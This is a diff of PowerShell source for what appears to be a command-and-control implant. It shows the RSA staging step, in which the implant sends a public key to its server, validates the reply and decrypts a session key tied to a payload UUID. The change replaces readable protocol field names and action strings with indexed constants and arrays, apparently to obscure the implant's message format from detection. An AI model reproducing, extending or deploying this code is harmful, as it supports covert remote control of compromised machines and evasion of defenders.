@@ -806,29 +806,29 @@ function Resolve-NuwaClmRsaStagingResponse {
         [hashtable]$KeyPair
     )
 
-    if ([string]$Response.action -cne 'staging_rsa') {
+    if ([int]$Response[$script:NuwaF_action] -ne $script:NuwaA_staging_rsa) {
         throw 'RSA staging response action did not match'
     }
-    if (-not (Test-NuwaClmStagingStringEqual -Left ([string]$Response.session_id) -Right $ExpectedSessionId)) {
+    if (-not (Test-NuwaClmStagingStringEqual -Left ([string]$Response[$script:NuwaF_session_id]) -Right $ExpectedSessionId)) {
         throw 'RSA staging response session identifier did not match'
     }
-    $uuidText = [string]$Response.uuid
+    $uuidText = [string]$Response[$script:NuwaF_uuid]
     if (-not (Test-NuwaCanonicalUuid -Value $uuidText)) {
         throw 'RSA staging response UUID was not canonical'
     }
     if ($uuidText -ceq ([string]$script:NuwaConfig.PayloadUUID)) {
         throw 'RSA staging response UUID must differ from the payload UUID'
     }
-    $ciphertext = ConvertFrom-NuwaClmStagingStrictBase64 -Value ([string]$Response.session_key)
+    $ciphertext = ConvertFrom-NuwaClmStagingStrictBase64 -Value ([string]$Response[$script:NuwaF_session_key])
     $candidateKey = Unprotect-NuwaClmRsaOaepSha1 -Ciphertext $ciphertext `
         -PrivateExponent ([bigint]$KeyPair.PrivateExponent) -Modulus ([bigint]$KeyPair.Modulus)
     if ($candidateKey.Length -ne 32) {
         throw 'RSA staging response session key decryption failed'
     }
-    return @{
-        OuterUuid = $uuidText
-        Key = [byte[]]$candidateKey
-    }
+    $candidateState = [object[]]@($null, $null, $null, $null, $null, $null, $null, $null, $null)
+    $candidateState[$script:NuwaK_OuterUuid] = $uuidText
+    $candidateState[$script:NuwaK_Key] = [byte[]]$candidateKey
+    return ,$candidateState
 }
 
 function Invoke-NuwaRsaStaging {
@@ -847,15 +847,18 @@ function Invoke-NuwaRsaStaging {
             $keyPair = New-NuwaClmRsaKeyPair
             $publicKey = ConvertTo-NuwaClmStagingPublicKey -KeyPair $keyPair
             $sessionId = New-NuwaClmStagingSessionId
+            $body = @{}
+            $body[$script:NuwaF_pub_key] = $publicKey
+            $body[$script:NuwaF_session_id] = $sessionId
             $response = Invoke-NuwaSendMessage -Uuid $script:NuwaCryptoState.OuterUuid `
-                -Action 'staging_rsa' -Body @{ pub_key = $publicKey; session_id = $sessionId }
+                -Action $script:NuwaA_staging_rsa -Body $body
             if ($null -eq $response) {
                 throw 'RSA staging returned no response'
             }
             $candidateState = Resolve-NuwaClmRsaStagingResponse -Response $response `
                 -ExpectedSessionId $sessionId -KeyPair $keyPair
         } catch {
-            Write-NuwaDebug ("RSA staging attempt {0}/3 failed" -f $attempt)
+            Write-NuwaDebug ("RSA staging attempt {0}/3 failed: {1}" -f $attempt, $_.Exception.Message)
         } finally {
             $publicKey = $null
             $sessionId = $null
